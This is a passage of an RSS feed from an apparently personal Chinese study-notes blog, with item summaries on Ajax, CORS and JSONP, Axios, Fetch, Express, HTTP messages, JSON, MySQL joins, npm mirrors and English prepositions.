      <description>请求超时设置 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  // 针对 ie 缓存的设置 app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 设置延时响应 	setTimeout(() =&amp;gt; { 	response.send(&amp;#39;Hello IE&amp;#39;); 	}, 3000); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 跨域</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E8%B7%A8%E5%9F%9F/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E8%B7%A8%E5%9F%9F/</guid>
      <description>跨域 同源策略 同源策略是一种出于浏览器安全方面的考虑而出台的一种策略，它可以保证用户信息的安全，防止恶意的网站窃取。同源策略只允许与本域下的接口交互，不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。
同源：同协议、同域名、同端口，必须完全相同，违背同源策略，就是跨域。
同源策略的限制范围  Cookie，localStorage，IndexDB 无法读取 DOM 无法获得 AJAX 请求不能发送  如何解决跨域问题 JSONP JSONP 是浏览器与客户端跨域通信常用的一种方法。
script标签本身具有跨域的特性，JSONP 就是借助这个特定来解决跨域的问题的。
CORS CORS 的全称是跨源资源共享，是一种 ajax 跨域请求资源的方式.
// * 表示所有网站都可以跨域请求当前服务器 response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); // 也可以只有某个网站才能对服务器发送跨域请求 response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;yxzi.xyz&amp;#39;); </description>
    </item>
    
    <item>
      <title>Ajax 重复发送请求的问题</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E9%87%8D%E5%A4%8D%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E9%87%8D%E5%A4%8D%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
      <description>重复发送请求的问题 当用户重复发送同一个请求的时候，我们为了服务器的效率考虑，需要将之前发送的请求取消掉，只发送一个最新的请求，这样，服务器所受到的压力就要小很多。
服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 设置延时响应 	setTimeout(() =&amp;gt; { 	response.send(&amp;#39;Hello IE&amp;#39;); 	}, 1000); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Axios</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/axios/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/axios/</guid>
      <description>Axios Axios 是一个基于 promise 的 HTTP 库，简单的讲就是可以发送 get、post 请求。说到 get、post，大家应该第一时间想到的就是 Jquery 吧，毕竟前几年 Jquery 比较火的时候，大家都在用他。但是由于 Vue、React 等框架的出现，Jquery 也不是那么吃香了。也正是 Vue、React 等框架的出现，促使了 Axios 轻量级库的出现，因为 Vue 等，不需要操作 Dom，所以不需要引入 Jquery.js 了。
安装 npm install axios CND &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/axios/0.27.2/axios.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; </description>
    </item>
    
    <item>
      <title>Axios 发送 Ajax 请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/axios-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/axios-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Axios 发送 Ajax 请求 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/axios&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;);  	const data = { name: &amp;#39;Rainy&amp;#39; }; 	const str = JSON.stringify(data); 	response.send(data); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Fetch 发送 Ajax</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/fetch-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/fetch-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Fetch 发送 Ajax 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/fetch&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)   const data = { name: &amp;#39;Rainy&amp;#39; }  const str = JSON.stringify(data);  response.send(data) })   app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Jquery 发送 Ajax</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/jquery-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/jquery-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Jquery 发送 Ajax 服务端 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;./css/main.css&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;Jquery 发送 Ajax&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;button id=&amp;#34;btn&amp;#34;&amp;gt;点击按钮，发送 GET 请求&amp;lt;/button&amp;gt;  &amp;lt;button id=&amp;#34;btnTwo&amp;#34;&amp;gt;点击按钮，发送 POST 请求&amp;lt;/button&amp;gt;  &amp;lt;button id=&amp;#34;btnThree&amp;#34;&amp;gt;点击按钮，发送通用方式请求&amp;lt;/button&amp;gt;   &amp;lt;div id=&amp;#34;result&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;   &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; CSS #result { 	width: 200px; 	height: 100px; 	border: 1px solid #999; } JavaScrip // get 方式 $(&amp;#39;#btn&amp;#39;).</description>
    </item>
    
    <item>
      <title>Jquery 发送 Jsonp</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jquery-%E5%8F%91%E9%80%81-jsonp/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jquery-%E5%8F%91%E9%80%81-jsonp/</guid>
      <description>Jquery 发送 Jsonp 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/jquery_jsonp&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 定义数据 	const data = { 	city: &amp;#39;贵州&amp;#39;, 	}; 	// 将数据转为字符串 	let str = JSON.stringify(data); 	// 接受 callback 	let cb = request.query.callback; 	// 响应结果， 	response.</description>
    </item>
    
    <item>
      <title>原生 Jsonp 的实现</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E5%8E%9F%E7%94%9F-jsonp-%E7%9A%84%E5%AE%9E%E7%8E%B0/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E5%8E%9F%E7%94%9F-jsonp-%E7%9A%84%E5%AE%9E%E7%8E%B0/</guid>
      <description>原生 Jsonp 的实现 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/check&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 定义数据 	const data = { 	exist: 1, 	msg: &amp;#39;用户已经存在&amp;#39;, 	}; 	// 将数据转为字符串 	let str = JSON.stringify(data); 	// 响应结果，一个函数调用，函数已经在前端提前声明 	response.end(`handle(${str})`); });  app.listen(port, () =&amp;gt; { 	console.</description>
    </item>
    
    <item>
      <title>Ajax</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/ajax/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/ajax/</guid>
      <description>Ajax 可以理解为异步的 JavaScript 和 xml。
它是一种在无需重新加载整个网页的情况下，能够更新部分网页内容的技术。
它不是一种新的编程语言，而是一种将现有标准组合在一起使用的新方式。
优点 可以无需刷新页面与服务器进行通信。
允许根据用户事件来更新部分页面内容。
缺点 没有浏览历史，无法进行网页后退或前进的操作。
存在跨域问题。默认情况下，不同的域名之间，无法发送 Ajax 请求。
对 SEO 的优化不友好，Ajax 返回当数据不会在网页源代码中存在。</description>
    </item>
    
    <item>
      <title>Ajax GET 请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/get-%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/get-%E8%AF%B7%E6%B1%82/</guid>
      <description>GET 请求 使用 GET 的方式向服务端发送一个请求。
服务端 const express = require(&amp;#39;express&amp;#39;); const app = express(); const port = 8000; app.get(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.send(&amp;#39;Hello World! GET&amp;#39;); }); // 允许 get 方式的请求 app.get(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.send(&amp;#39;Hello World!&amp;#39;); }); app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 响应 JSON 数据</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E5%93%8D%E5%BA%94-json-%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E5%93%8D%E5%BA%94-json-%E6%95%B0%E6%8D%AE/</guid>
      <description>响应 JSON 数据 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;); const app = express(); const port = 8000; app.all(&amp;#39;/json-server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 响应一个数据 	const data = { 	name: &amp;#39;Rainy&amp;#39;, 	age: &amp;#39;18&amp;#39;, 	}; 	// 将对象转换为字符串类型的数据 	let str = JSON.stringify(data); 	// 设置响应体，响应体只能是一个字符串 	response.send(str); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!</description>
    </item>
    
    <item>
      <title>Express</title>
      <link>https://note.yxzi.xyz/note/technology/frame/express/express/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/express/express/</guid>
      <description>Express 基于 Node.js 的 Web 开发框架，可以快速地搭建一个完整功能的网站。
安装 新建一个工作区，输入npm install express --save即可。
基本使用 新建一个名为Express.js的 js 文件，输入代码：
// 引入 express const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  // 创建应用对象 const app = express();  // 设置端口号 const port = 8000;  // 创建路由规则，允许所有方 式的请求 app.all(&amp;#39;/json-server&amp;#39;, (request, response) =&amp;gt; { 	// 设置响应头，允许跨域 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	// 允许接收所有类型的响应头 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 响应一个数据 	const data = { 	name: &amp;#39;Rainy&amp;#39;, 	age: &amp;#39;18&amp;#39;, 	}; 	// 将对象转换为字符串类型的数据 	let str = JSON.</description>
    </item>
    
    <item>
      <title>HTTP</title>
      <link>https://note.yxzi.xyz/note/technology/internet/http/http/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/http/http/</guid>
      <description>HTTP 超文本传输协议。详细规定了浏览器和万维网服务器之间互相通信的规则。
请求报文 浏览器向服务器发送内容的过程叫做请求。
请求报文一般包含四部分：行、头、空行、体。
请求行 请求类型：GET、POST 等。
URL 。
HTTP 协议的版本。
GET /ValidateLogin?&amp;amp;userI=4234234&amp;amp;password=234234 HTTP/1.1 请求头 请求头的格式通常时键名:键值
Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en- Cookie: Hm_lvt_a2e2e465098d883036e3cfad66f7203d=1633793709; Hm_lvt_bf329994f1e3ebf56f3712e11a46cb4a=1633794836; Hm_lvt_8516e418a4e3ac3474b3c13bdb4687e7=1638612924; _uab_collina=164345858532791240726438 Host: 127.0.0.1:5500 Content-Type # 设置请求体n类型 请求空行 空行必须有。
请求体 GET 的请求体是空的。
POST 的请求体可以不为空，也可以为空。
响应报文 服务器给客户端/浏览器返回结果的过程叫做响应。
响应报文一般包含四部分：行、头、空行、体。
响应行 HTTP 版本
响应状态码
响应状态字符串
HTTP/1.1 200 OK 响应头 Server: JSP3/2.0.14 Date: Sat, 30 Apr 2022 08:16:27 GMT Content-Type: text/javascript; charset=utf-8 Content-Length: 15758 Content-Encoding: gzip 响应空行 必须有</description>
    </item>
    
    <item>
      <title>JavaScrip JSON</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/json/json/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/json/json/</guid>
      <description>JOSN 一种轻量级的数据传输格式。本质上就是对象，用来传输的对象。
它在与后端的数据交互中有较为广泛的应用。
优点 JSON 比 XML 更小、更快，更易解析。
语法 客户端与服务端的交互数据无非就是两种：
 数组 对象  于是乎，JSON 所表示的数据要么就是对象，要么就是数组。
JSON 数组 var employees = [ 	{ firstName: &amp;#39;Bill&amp;#39;, lastName: &amp;#39;Gates&amp;#39; }, 	{ firstName: &amp;#39;George&amp;#39;, lastName: &amp;#39;Bush&amp;#39; }, 	{ firstName: &amp;#39;Thomas&amp;#39;, lastName: &amp;#39;Carter&amp;#39; }, ]; JSON 对象 var obj = { 	age: 20, 	str: &amp;#39;zhongfucheng&amp;#39;, 	method: function () { 	alert(&amp;#39;我爱学习&amp;#39;); 	}, }; </description>
    </item>
    
    <item>
      <title>JavaScrip JSON 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/json/json-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/json/json-%E6%96%B9%E6%B3%95/</guid>
      <description>JSON 方法 stringify() 将一个对象或值转换为 JSON 字符串。
var obj = { 	name: &amp;#39;rainy&amp;#39;, 	age: &amp;#39;20&amp;#39;, }; var result = JSON.stringify(obj); // 对象 console.log(obj);  // 字符串 console.log(result); parse() 将 JSON 字符串转换为对象。
var json = &amp;#39;{&amp;#34;name&amp;#34;:&amp;#34;rainy&amp;#34;, &amp;#34;age:&amp;#34;:20}&amp;#39;;var obj = JSON.parse(json);// 字符串console.log(json);// 对象console.log(obj); </description>
    </item>
    
    <item>
      <title>MySQL 交叉链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E4%BA%A4%E5%8F%89%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E4%BA%A4%E5%8F%89%E9%93%BE%E6%8E%A5/</guid>
      <description>交叉链接 返回左表中的所有行，左表中的每一行与右表中的所有行组合。交叉联接也称作笛卡尔积
笛卡尔乘积错误 表 1 有 N 行，表 2 有 M 行，最终的查询结果就是 M * N 行。****
SELECT b.name,boy.boyName FROM beauty AS b,boys AS boy 笛卡尔乘积也叫交叉链接：
SELECT b.name,boy.boyName FROM beauty AS b CROSS JOIN boys boy 导致错误的原因是因为没有添加有效的链接条件。
只需要添加有效的链接条件即可：
SELECT b.name,boy.boyName FROM beauty AS b LEFT OUTER JOIN boys AS boy # 链接条件 ON b.boyfriend_id = boy.id </description>
    </item>
    
    <item>
      <title>NodeJs</title>
      <link>https://note.yxzi.xyz/note/technology/nodejs/nodejs/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/nodejs/nodejs/</guid>
      <description>Node.js Node.js 不是一种独立的语言，也不是一个 JavaScript 的框架，Node.js 只是一个让 JavaScript 运行在浏览器之外的平台。
安装 Node.js </description>
    </item>
    
    <item>
      <title>Nodemon</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/nodemon/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/nodemon/</guid>
      <description>Nodemon 当我们开发一个 node 后端服务时，每次更改服务端文件，均需重启一下服务才能生效。这使我们的开发效率降低了很多。Nodemon 的出现，放我们可以随时监听文件的变更，自动重启服务，我们开发时只需关注代码即可，不再需要手动重启服务。
安装 终端运行
npm install -g nodemon 使用 nodemon server.js </description>
    </item>
    
    <item>
      <title>npm 镜像</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm-%E9%95%9C%E5%83%8F/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm-%E9%95%9C%E5%83%8F/</guid>
      <description>npm 镜像 因为 npm 服务器在国外，因此我们有时候 install 一些 package 的时候，会因为网络问题而下载失败，比如运行npm install时，出现以下错误：
 idealTree:Test: sill idealTree buildDeps 所以，我们需要换一个国内的镜像。
配置源地址为国内的淘宝镜像：
npm config set registry https://registry.npm.taobao.org 使用 nrm 工具切换淘宝源
npx nrm use tao 检查是否设置成功：
npm config get registry # 淘宝镜像 https://registry.npm.taobao.org/ 重新安装即可。</description>
    </item>
    
    <item>
      <title>XML</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/json/xml/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/json/xml/</guid>
      <description>XML 可扩展标记语言，主要用来传输和存储数据。
XML 和 HTML 类似，不同的是 HTML 中都是预定义的标签，用来呈现数据；而 XML 中没有预定义标签，都是自定义标签，用来表示一些数据。
不过，现在地 XML 已经被 JSON 取代了。</description>
    </item>
    
    <item>
      <title>English against</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/against/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/against/</guid>
      <description>against 表示接触 against + 人或事物的词语 表示靠着某人某物。强调两个事物的直接接触。
  He sat against the tree.
  She stood against each other.
  表示反对 against + 某些词语 表示反对&amp;hellip;。
  I am against this plan.
  Are you for this plan.
  </description>
    </item>
    
    <item>
      <title>English along</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/along/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/along/</guid>
      <description>along 表示运动 along + 地点或位置的词语 表示沿着某个地方运动。喜欢与动作表示动作趋向的不及物动词搭配。
 We go along the river.  </description>
    </item>
    
    <item>
      <title>English among</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/among/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/among/</guid>
      <description>among among + 名词的复数或表示复数的代词 表示在三者或三者以上的人或人或事物当中
 I am the poorest among all my friend.  </description>
    </item>
    
    <item>
      <title>English beyond</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beyond/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beyond/</guid>
      <description>beyondqian 表示位置 beyond + 比较远的位置的词语 表示**在&amp;hellip;外边。**强调在很远的地方的那一边。</description>
    </item>
    
    <item>
      <title>MySQL  内链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/%E5%86%85%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/%E5%86%85%E9%93%BE%E6%8E%A5/</guid>
      <description>内链接 查询的是多张表交集部分的记录。
SQL 99 内链接 SQL 99 支持内链接、外连接以及交叉链接，并且该版本的链接查询语法要比 SQL 92 的可读性要高）。
SELECT 查询列表 FROM 表一 别名 INNER JOIN 表二 别名 # SQL 92 用 WHERE，SQL99 用 ON ON 链接条件 WHERE SQL 92 内链接 SQL 92 只支持内链接，语法：
SELECT 查询列表 FROM 表一 别名,表二 别名 WHERE 链接条件 </description>
    </item>
    
    <item>
      <title>English across</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/across/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/across/</guid>
      <description>across 表示穿过/横穿 across + 物体的词语 表示在物体的表面穿过。经常与一些表示动作趋向的不及物动词搭配。
 We walk across the road. The children run across the street.  表示位置 across + 位置的词语 表示在&amp;hellip;对面
 My parents live across the street.  </description>
    </item>
    
    <item>
      <title>English into</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/into/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/into/</guid>
      <description>into 表示运动 动作趋势的不及物动词 + into 表示**&amp;hellip;进/进入&amp;hellip;**</description>
    </item>
    
    <item>
      <title>English outside</title>
